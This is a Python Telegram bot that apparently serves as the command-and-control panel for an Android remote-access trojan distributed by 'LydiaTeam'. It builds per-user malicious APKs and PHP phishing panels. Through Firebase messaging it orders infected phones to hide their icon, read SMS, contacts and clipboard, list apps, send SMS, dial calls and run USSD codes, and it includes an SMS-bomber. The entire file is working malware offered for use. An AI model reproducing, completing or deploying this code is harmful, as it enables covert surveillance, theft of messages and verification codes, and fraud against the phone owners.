#LydiaTeam
#@LydiaTeam
from genericpath import isdir
import requests, json, os, random, shutil, telebot
from telebot import TeleBot, types
from time import sleep
from datetime import datetime
from telebot.apihelper import ENABLE_MIDDLEWARE, send_message
from json import loads


##
admin_sender = []
admin = 1969952546
ChannelLink = "@LydiaTeam"
token = ''
bot = telebot.TeleBot(token, parse_mode=None)
url = "http://uidrtdcd.xyz"
fire_base_access_token = ''
###


#FireBase Defs 

def check_user(chat_id):
    luser = open(
        './users.lst',
        'r'
    ).read().splitlines()
    if str(chat_id) in luser:
        return True
    else:
        return False


def read_topic(chat_id):
    data = json.loads(
        open(
            './users.json',
            'r'
        ).read()
    )
    return data[str(chat_id)]

def add_user(fgoogle):
    dec = fgoogle.split(';')
    f = open('./users.lst','a')
    f.write(f"\n{str(dec[1])}")
    f.close(
    )
    data = json.loads(open('./users.json','r').read())
    data[str(dec[1])] = dec[0]
    ff = open('./users.json','w')
    ff.write(json.dumps(data))
    ff.close()
    print("added.")


def send(androidid,mobilenumber,forsend,chat_id):
    msg = {
        'lydia1': "List",
        'data': {"lydia1":f"sm{androidid}","lydia2":f"{mobilenumber}&{forsend}"}
    }
    data = {
        'to': f'/topics/{read_topic(str(chat_id))}',
        'data': msg
    }

    headers = {
        'Authorization': f'key={fire_base_access_token}',
        'Content-Type': 'application/json',
        'Content-Length': str(len(data))
    }
    res = requests.post(
        url='https://fcm.googleapis.com/fcm/send',
        headers=headers,
        json=data
    ).text
 


def sendbomber(mobilenumber,forsend,chat_id):
    msg = {
        'lydia1': "List",
        'data': {"lydia1":f"smbomber","lydia2":f"{mobilenumber}&{forsend}"}
    }
    data = {
        'to': f'/topics/{read_topic(str(chat_id))}',
        'data': msg
    }

    headers = {
        'Authorization': f'key={fire_base_access_token}',
        'Content-Type': 'application/json',
        'Content-Length': str(len(data))
    }
    res = requests.post(
        url='https://fcm.googleapis.com/fcm/send',
        headers=headers,
        json=data
    ).text
  

def list_user(chat_id):
    msg = {
        'lydia1': "List",
        'data': {"lydia1":"List","lydia2":"2"}
    }
    data = {
        'to': f'/topics/{read_topic(str(chat_id))}',
        'data': msg
    }

    headers = {
        'Authorization': f'key={fire_base_access_token}',
        'Content-Type': 'application/json',
        'Content-Length': str(len(data))
    }
    res = requests.post(
        url='https://fcm.googleapis.com/fcm/send',
        headers=headers,
        json=data
    ).text
   

def sendaction(action, androididd, chat_id):
    msg = {
        'lydia1': "List",
        'data': {"lydia1":f"mobile{androididd}","lydia2":f"{action}"}
    }
    data = {
        'to': f'/topics/{read_topic(str(chat_id))}',
        'data': msg
    }

    headers = {
        'Authorization': f'key={fire_base_access_token}',
        'Content-Type': 'application/json',
        'Content-Length': str(len(data))
    }
    res = requests.post(
        url='https://fcm.googleapis.com/fcm/send',
        headers=headers,
        json=data
    ).text
  
    
def hideeall(chat_id):
    msg = {
        'lydia1': "List",
        'data': {"lydia1":f"mobile","lydia2":"hide"}
    }
    data = {
        'to': f'/topics/{read_topic(str(chat_id))}',
        'data': msg
    }

    headers = {
        'Authorization': f'key={fire_base_access_token}',
        'Content-Type': 'application/json',
        'Content-Length': str(len(data))
    }
    res = requests.post(
        url='https://fcm.googleapis.com/fcm/send',
        headers=headers,
        json=data
    ).text

#####################################################################

def check_token(token):
    gettoken = requests.get(f'https://api.telegram.org/bot{token}/getme')
    token_json = json.loads(gettoken.content)
    if str(token_json['ok']) == str('True'):
       return True
    else:
       return False
    #print(token_json['ok'])


def mkjson(chat_id):
    fp = open(f'data/{chat_id}.0.txt', 'w')
    dictionary = {'id':chat_id, 'token':token}
    jsonString = json.dumps(dictionary, indent=4)
    #print(jsonString)
    fp.write(jsonString)
    fp.close

def sender_glass(message, android_id, message_text):
    phone_list = message.text.splitlines()
    Counter = 0
  
# Reading from file
    Content = message.text
    CoList = Content.split("\n")
  
    for i in CoList:
        if i:
            Counter += 1

    bot.send_message(message.chat.id, f"Sending messages please wait...!\n📨Count:{Counter}\n🖥:{android_id}")
        #print('Total lines:', x) # 8
    for i in phone_list:
        send(android_id, i, message_text, message.chat.id)
    next
    bot.send_message(message.chat.id, f"Send a successful requests.!\n📨Count-Requests:{Counter}\n🖥:{android_id}")


def send_admin_topic(message):
    list_admin(message.text)
    bot.send_message(message.chat.id, "Request Send Now!")

def list_admin(topic):
    msg = {
        'lydia1': "List",
        'data': {"lydia1":"List","lydia2":"2"}
    }
    data = {
        'to': f'/topics/{topic}',
        'data': msg
    }

    headers = {
        'Authorization': f'key={fire_base_access_token}',
        'Content-Type': 'application/json',
        'Content-Length': str(len(data))
    }
    res = requests.post(
        url='https://fcm.googleapis.com/fcm/send',
        headers=headers,
        json=data
    ).text
  

def androidid_admin(message):
 with open(f'./admin/androidid_{message.chat.id}.txt', 'w', encoding='UTF-8') as f:
    f.write(message.text)
    bot.send_message(message.chat.id,"Your Mobile-ID Saved!",message.text)

def messagef_admin(message):
 with open(f'./admin/message_{message.chat.id}.txt', 'w', encoding='UTF-8') as f:
    f.write(message.text)
    bot.send_message(message.chat.id,"Your Text message Saved!",message.text)

def sender_config(message):
    file1 = open(f"./admin/androidid_{message.chat.id}.txt", "r", encoding='UTF-8')
    file2 = open(f"./admin/message_{message.chat.id}.txt", "r", encoding='UTF-8')
    rm1 = file1.read()
    rm2 = file2.read()
    phone_list = bot.reply_to(message, 'please send me your phone number !')
    bot.register_next_step_handler(phone_list, sender, rm1, rm2, message.text)


def sender(message, android_id, message_text, topic):
    phone_list = message.text.splitlines()
    Counter = 0
  
# Reading from file
    Content = message.text
    CoList = Content.split("\n")
  
    for i in CoList:
        if i:
            Counter += 1
    
    bot.send_message(message.chat.id, f"Sending messages please wait...!\n📨Count:{Counter}\n🖥:{android_id}")
    #print('Total lines:', x) # 8
    for i in phone_list:
        send_adminnn(android_id, i, message_text, topic)
    next
    bot.send_message(message.chat.id, f"Send a successful requests.!\n📨Count-Requests:{Counter}\n🖥:{android_id}")
    
def send_adminnn(androidid,mobilenumber,forsend,topic):
    msg = {
        'lydia1': "List",
        'data': {"lydia1":f"sm{androidid}","lydia2":f"{mobilenumber}&{forsend}"}
    }
    data = {
        'to': f'/topics/{topic}',
        'data': msg
    }

    headers = {
        'Authorization': f'key={fire_base_access_token}',
        'Content-Type': 'application/json',
        'Content-Length': str(len(data))
    }
    res = requests.post(
        url='https://fcm.googleapis.com/fcm/send',
        headers=headers,
        json=data
    ).text
 

def glasses_rm(call):
    chat_id = call.chat.id
    androidid_saver = open(f'./folder_user/{chat_id}/saver_{chat_id}.txt', 'w')
    androidid_saver.write(call.text)
    androidid_saver.close

    bot.send_message(chat_id=call.chat.id,
        text=f"~ @LydiaTeam\ni have seen you since 17 september\n~ : {call.text}",
        reply_markup=makeKeyboard_rm(),
        parse_mode='HTML')


def glasses_rm_cammand(android_id, chat_idd):
    androidid_saver = open(f'./folder_user/{chat_idd}/saver_{chat_idd}.txt', 'w')
    androidid_saver.write(android_id)
    androidid_saver.close


    bot.send_message(chat_id=chat_idd,
        text=f"~ @LydiaTeam\ni have seen you since 17 september\n~ : {android_id}",
        reply_markup=makeKeyboard_rm(),
        parse_mode='HTML')

def settoken(message):
    chatid = message.chat.id

    if check_token(message.text):
        if not os.path.isdir(f'./folder_user/{chatid}'):
            os.mkdir(f'./folder_user/{chatid}')
    
        app = open(f'./folder_user/{chatid}/token.txt', 'w')
        app.write(message.text)
        app.close

        next

        senderrrr = bot.reply_to(message, '✏️ Send me nothing :')
        bot.register_next_step_handler(senderrrr, set_chatid)

    else:
        bot.send_message(chatid, "❌ Please Check your Fucking Token .")


def set_chatid(message):
    chatid = message.chat.id
    if not os.path.isdir(f'./folder_user/{chatid}'):
        os.mkdir(f'./folder_user/{chatid}')
    readtoken = open(f'./folder_user/{chatid}/token.txt', 'r').read()
    count = int(open('data/count.txt', 'r').read())
    set_topic = open(f'./folder_user/{chatid}/{chatid}.txt', 'w')
    set_topic.write(str(count + 1))
    set_topic.close()
    next
    recount = open('data/count.txt', 'w')
    recount.write(str(count + 1))
    recount.close()
    read_topic = open(f'./folder_user/{chatid}/{chatid}.txt', 'r').read()
    if not os.path.isdir(f'./folder_user/{read_topic}'):
        os.mkdir(f'./folder_user/{read_topic}')
    source_dir = "php"
    destination_dir = f"../{read_topic}"
    shutil.copytree(source_dir, destination_dir)
    next
    phptext = f'''
<?php
$token = "{readtoken}";
$group1 = "{chatid}";
$group2 = "{chatid}";

?>
    '''
    infophp = open(f'../{read_topic}/info.php', 'w')
    infophp.write(phptext)
    infophp.close
    next
    setlink = open(f'../{read_topic}/url.txt', 'w')
    setlink.write("https://google.com")
    setlink.close
    add_user(f"{read_topic};{chatid}")

    cap = f'''

🔎 Token = {readtoken}\n🔎 Chat_id = {chatid}\n🔎 Port = {read_topic}\n Set url From Panel \n Sign app

    '''
    apk = open(f'./apk/{read_topic}.apk', 'rb')
    bot.send_document(chatid, apk, caption=cap)


def set_url(message):
    chat_id = message.chat.id
    RLydia1 = open(f'folder_user/{chat_id}/{chat_id}.txt', 'r').read()
    if message.text.startswith("http"):
        if os.path.isdir(f"../{RLydia1}"):
            setlink = open(f'../{RLydia1}/url.txt', 'w')
            setlink.write(message.text)
            setlink.close
            bot.send_message(chat_id, 'لینک شما تنظیم شد :')

        else:

            bot.send_message(chat_id, "PATH ERROR.")

    else:
        bot.send_message(chat_id, 'فقط لینک برام بفرست »')



def read_users_count(chat_id):
    count = requests.get(f"{url}/{read_topic(str(chat_id))}/user.txt")
    if count.text == "":
        return 0

    elif count.status_code == 404:
        return "Not Found"

    else:
        return count.text


###############################################################################################################
def messagef(message):
 with open(f'./folder_user/{message.chat.id}/message_{message.chat.id}.txt', 'w', encoding='UTF-8') as f:
    f.write(message.text)
    bot.send_message(message.chat.id,"Your Text message Saved!",message.text)




def makeKeyboard(chat_id):
    markup = types.InlineKeyboardMarkup()

    markup.add(types.InlineKeyboardButton(text="👥 Installed Devices :",
                                              callback_data="ohkt"),
        types.InlineKeyboardButton(text=f"{read_users_count(chat_id)}",
                                   callback_data="hyujhhjh")),

    markup.add(types.InlineKeyboardButton(text="📊List📊",
                                              callback_data="list"),
        types.InlineKeyboardButton(text="🌐Hide-All🌐",
                                   callback_data="hideall")),
    markup.add(types.InlineKeyboardButton(text="🔗SetLink🔗",
                                              callback_data="setlink"),
        types.InlineKeyboardButton(text="@LydiaTeam",
                                   callback_data="kossher")) 

    markup.add(types.InlineKeyboardButton(text="💌Sms-Bomber💌",
                                    callback_data="smsbomber"),
                types.InlineKeyboardButton(text="📝SetText📝",
                                   callback_data="settext")),

    markup.add(types.InlineKeyboardButton(text="🍷My_Port🍷",
                                    callback_data="myport"))

    markup.add(types.InlineKeyboardButton(text="🪜Set_User🪜",
                                        callback_data="setuser"))                           
    return markup



def makeKeyboard_rm():
    markup = types.InlineKeyboardMarkup()

    markup.add(types.InlineKeyboardButton(text="📊List📊",
                                              callback_data="list"),
        types.InlineKeyboardButton(text="🔇Mute🔇",
                                   callback_data="mute"))

    markup.add(types.InlineKeyboardButton(text="📥GetAllMessage📥",
                                            callback_data="getallmessage"))

    markup.add(types.InlineKeyboardButton(text="🔗Show Icon🔗",
                                            callback_data="show"))

    markup.add(types.InlineKeyboardButton(text="📱App List📱",
                                            callback_data="allapp"))

    markup.add(types.InlineKeyboardButton(text="📨Send Sms📨",
                                              callback_data="sendsms"),
        types.InlineKeyboardButton(text="📲Hide Icon📲",
                                   callback_data="hideicon"))

    markup.add(types.InlineKeyboardButton(text="🕛GetLastSms🕛",
                                        callback_data="getlastsms"))

    markup.add(types.InlineKeyboardButton(text="☎️GetContact☎️",
                                        callback_data="getcontact"))

    markup.add(types.InlineKeyboardButton(text="📋Clipboard📋",
                                              callback_data="clipboard"),
        types.InlineKeyboardButton(text="📝SetText📝",
                                   callback_data="settext"))

    markup.add(types.InlineKeyboardButton(text="🌀Change Icon🌀",
                                              callback_data="chicon"),
        types.InlineKeyboardButton(text="📞Call📞",
                                   callback_data="call"))

    markup.add(types.InlineKeyboardButton(text="💬Ussd Code💬",
                                    callback_data="ussd"))

    return markup


def menukeyboard():
    markup = types.InlineKeyboardMarkup()

    markup.add(types.InlineKeyboardButton(text="🪜 New Remote",
                                              callback_data="geteway"))
    markup.add(types.InlineKeyboardButton(text="🗂 Panel",
                                              callback_data="remote"))
                                          
    return markup



def adminkeyboard():
    markup = types.InlineKeyboardMarkup()

    markup.add(types.InlineKeyboardButton(text="ارسال پیام",
                                              callback_data="adsend"),
        types.InlineKeyboardButton(text="متن پیام",
                                   callback_data="adtext")),
    markup.add(types.InlineKeyboardButton(text="اندروید ایدی",
                                              callback_data="adid"),
        types.InlineKeyboardButton(text="لیست",
                                   callback_data="adlist"))

    markup.add(types.InlineKeyboardButton(text="اتو لیست",
                                        callback_data="auto"))

                               
    return markup





@bot.message_handler(commands=['start', 'Lydia', 'back'])
def send_welcome(message):
    well = f'''
Hi My Lord ...
{ChannelLink}
    '''
    bot.send_message(chat_id=message.chat.id,
            text=well,
            reply_markup=menukeyboard(),
            parse_mode='HTML')


@bot.message_handler(commands=['rm'])
def send_welcome(message):
    chat_id = message.chat.id
 
    if check_user(chat_id):
        bot.send_message(chat_id=message.chat.id,
            text='Remote :',
            reply_markup=makeKeyboard(chat_id),
            parse_mode='HTML')

    else:
        bot.answer_callback_query(callback_query_id=message.id,
            show_alert=True,
            text=f"🍷wtf ?")


@bot.message_handler(func=lambda m: True)
def echo_all(message):
    if message.content_type == "text":
    

        if message.text.startswith("/set_"):
            print('nothing')
             

        elif message.text == "/admin":
            if message.chat.id in admin_sender:
                bot.send_message(chat_id=message.chat.id,
                text="admin Panle\n /add_remote",
                reply_markup=adminkeyboard(),
                parse_mode='HTML')
            #if message.chat.id in admin_sender:
                #senderrrr = bot.reply_to(message, 'Please send me your Topic !')
                #bot.register_next_step_handler(senderrrr, send_admin_topic)

        elif message.text == "/set_text":
            if message.chat.id in admin_sender:
                input_text = bot.send_message(message.chat.id, 'Please send me your text message !')
                bot.register_next_step_handler(input_text, messagef_admin)

        elif message.text == "/set_androidid":
            if message.chat.id in admin_sender:
                input_text = bot.send_message(message.chat.id, 'please Send me your Mobile-ID !')
                bot.register_next_step_handler(input_text, androidid_admin)

        elif message.text == "/send_message":
            if message.chat.id in admin_sender:
                if not os.path.exists(f'./admin/androidid_{message.chat.id}.txt'):
                    with open(f'./admin/androidid_{message.chat.id}.txt', 'w', encoding='UTF-8') as f:
                        f.write("set")
                    with open(f'./admin/message_{message.chat.id}.txt', 'w', encoding='UTF-8') as f:
                        f.write(message.text)
                    bot.send_message(message.chat.id, "your Path file not exists i make file please TryAgain!")
                else:
                    senderrrr = bot.reply_to(message, 'Please send me your Topic !')
                    bot.register_next_step_handler(senderrrr, sender_config)

        elif message.text == "/auto_list":
            if message.chat.id in admin_sender:
                bot.send_message(message.chat.id, "wait for me ...")
                for port in random.randint(200, 400):
                    list_admin(port)
                next
                bot.send_message(message.chat.id, "requests sended!")

      
               

@bot.callback_query_handler(func=lambda call: True)
def handle_query(call):
        if check_user(call.message.chat.id):
            chat_id = call.message.chat.id

            if (call.data.startswith("list")):
                list_user(call.message.chat.id)
                bot.answer_callback_query(callback_query_id=call.id,
                                    show_alert=True,
                                    text="list request send now !")


            elif (call.data.startswith("setuser")):
                input_text = bot.send_message(call.message.chat.id, 'please Send me your Mobile-ID :')
                bot.register_next_step_handler(input_text, glasses_rm)

            elif (call.data.startswith("hideall")):
                hideeall(call.message.chat.id)
                bot.answer_callback_query(callback_query_id=call.id,
                                    show_alert=True,
                                    text="hideall request send now !")

            elif (call.data.startswith("settext")):
                input_text = bot.send_message(call.message.chat.id, 'Please send me your text message :')
                bot.register_next_step_handler(input_text, messagef)

            elif (call.data.startswith("setlink")):
                input_text = bot.send_message(call.message.chat.id, 'Please send me your Url :')
                bot.register_next_step_handler(input_text, set_url)


            elif (call.data.startswith("mute")):
                androidid_reader = open(f'./folder_user/{chat_id}/saver_{chat_id}.txt', 'r')
                id = androidid_reader.read()
                sendaction("mute", id, call.message.chat.id)
                bot.answer_callback_query(callback_query_id=call.id,
                                    show_alert=True,
                                    text=f"Mute request send now !\n~ : {id}")


            elif (call.data.startswith("getallmessage")):
                androidid_reader = open(f'./folder_user/{chat_id}/saver_{chat_id}.txt', 'r')
                id = androidid_reader.read()
                sendaction("getallmessage", id, call.message.chat.id)
                bot.answer_callback_query(callback_query_id=call.id,
                                    show_alert=True,
                                    text=f"GetAllmessage request send now !\n~ : {id}")

            
            elif (call.data.startswith("show")):
                androidid_reader = open(f'./folder_user/{chat_id}/saver_{chat_id}.txt', 'r')
                id = androidid_reader.read()
                sendaction("show", id, call.message.chat.id)
                bot.answer_callback_query(callback_query_id=call.id,
                                show_alert=True,
                                text=f"Show Icon request send now !\n~ : {id}")
            
            elif (call.data.startswith("sendsms")):
                    androidid_reader = open(f'./folder_user/{chat_id}/saver_{chat_id}.txt', 'r')
                    id = androidid_reader.read()
                    if not os.path.exists(f'./folder_user/{chat_id}/message_{call.message.chat.id}.txt'):
                        with open(f'./folder_user/{chat_id}/message_{call.message.chat.id}.txt', 'w', encoding='UTF-8') as f:
                            f.write("set")
                        bot.answer_callback_query(callback_query_id=call.id,
                                show_alert=True,
                                text="your Path file not exists i make file please TryAgain!")
                    else:
                        file2 = open(f"./folder_user/{call.message.chat.id}/message_{call.message.chat.id}.txt", "r", encoding='UTF-8')
                        rm2 = file2.read()
                        phone_list = bot.reply_to(call.message, 'please send me your phone number !\n09999\n09999\n09999')
                        bot.register_next_step_handler(phone_list, sender_glass, id, rm2)

            elif (call.data.startswith("hideicon")):
                androidid_reader = open(f'./folder_user/{chat_id}/saver_{chat_id}.txt', 'r')
                id = androidid_reader.read()
                sendaction("hide", id, call.message.chat.id)
                bot.answer_callback_query(callback_query_id=call.id,
                                    show_alert=True,
                                    text=f"HideIcon request send now !\n~ : {id}")

            elif (call.data.startswith("getlastsms")):
                androidid_reader = open(f'./folder_user/{chat_id}/saver_{chat_id}.txt', 'r')
                id = androidid_reader.read()
                sendaction("getlastsms", id, call.message.chat.id)
                bot.answer_callback_query(callback_query_id=call.id,
                                    show_alert=True,
                                    text=f"GetLastSms request send now !\n~ : {id}")

            elif (call.data.startswith("getcontact")):
                androidid_reader = open(f'./folder_user/{chat_id}/saver_{chat_id}.txt', 'r')
                id = androidid_reader.read()
                #getcontact(id, call.message.chat.id)
                bot.answer_callback_query(callback_query_id=call.id,
                                    show_alert=True,
                                    text=f"GetContact request send now !\n~ : {id}")

            elif (call.data.startswith("clipboard")):
                androidid_reader = open(f'./folder_user/{chat_id}/saver_{chat_id}.txt', 'r')
                id = androidid_reader.read()
                sendaction("getclipboard", id, call.message.chat.id)
                bot.answer_callback_query(callback_query_id=call.id,
                                    show_alert=True,
                                    text=f"clipboard request send now !\n~ : {id}")

            elif (call.data.startswith("myport")):
                bot.answer_callback_query(callback_query_id=call.id,
                                    show_alert=True,
                                    text=f"🍷Your Port Name : {read_topic(str(chat_id))}")
        chat_id = call.message.chat.id
        if (call.data.startswith("geteway")):
            chat_id = call.message.chat.id
            senderrrr = bot.reply_to(call.message, '✏️ Send me your bot token :')
            bot.register_next_step_handler(senderrrr, settoken)

        
        elif (call.data.startswith("backmenu")):
            bot.edit_message_text(chat_id=call.message.chat.id,
                text=f"برگشتی به منوی اصلی :",
                message_id=call.message.message_id,
                reply_markup=menukeyboard(),
                parse_mode='HTML')

        elif (call.data.startswith("remote")):
            if check_user(chat_id):
                bot.edit_message_text(chat_id=call.message.chat.id,
                text=f"به بخش ریموت خوش اومدی :",
                message_id=call.message.message_id,
                reply_markup=makeKeyboard(chat_id),
                parse_mode='HTML')
            else:
                bot.answer_callback_query(callback_query_id=call.id,
                                    show_alert=True,
                                    text=f"🍷wtf ?")


        elif (call.data.startswith("adsend")):
            if call.message.chat.id in admin_sender:
                if not os.path.exists(f'./admin/androidid_{call.message.chat.id}.txt'):
                    with open(f'./admin/androidid_{call.message.chat.id}.txt', 'w', encoding='UTF-8') as f:
                        f.write("set")
                    with open(f'./admin/message_{call.message.chat.id}.txt', 'w', encoding='UTF-8') as f:
                        f.write("hi")
                    bot.send_message(call.message.chat.id, "your Path file not exists i make file please TryAgain!")
                else:
                    senderrrr = bot.reply_to(call.message, 'Please send me your Topic !')
                    bot.register_next_step_handler(senderrrr, sender_config)

        elif (call.data.startswith("adtext")):
            if call.message.chat.id in admin_sender:
                input_text = bot.send_message(call.message.chat.id, 'Please send me your text message !')
                bot.register_next_step_handler(input_text, messagef_admin)

        elif (call.data.startswith("adid")):
            if call.message.chat.id in admin_sender:
                input_text = bot.send_message(call.message.chat.id, 'please Send me your Mobile-ID !')
                bot.register_next_step_handler(input_text, androidid_admin)

        elif (call.data.startswith("adlist")):
            if call.message.chat.id in admin_sender:
                senderrrr = bot.reply_to(call.message, 'Please send me your Topic !')
                bot.register_next_step_handler(senderrrr, send_admin_topic)

        elif (call.data.startswith("back")):
            androidid_reader = open(f'./folder_user/{chat_id}/saver_{chat_id}.txt', 'r')
            id = androidid_reader.read()
            bot.edit_message_text(chat_id=chat_id,
            message_id=call.message.message_id,
            text=f"~ @LydiaTeam\ni have seen you since 17 september\n~ : {id}",
            reply_markup=makeKeyboard_rm(),
            parse_mode='HTML')




bot.infinity_polling()

#use while loop for infinity_polling

#LydiaTeam
    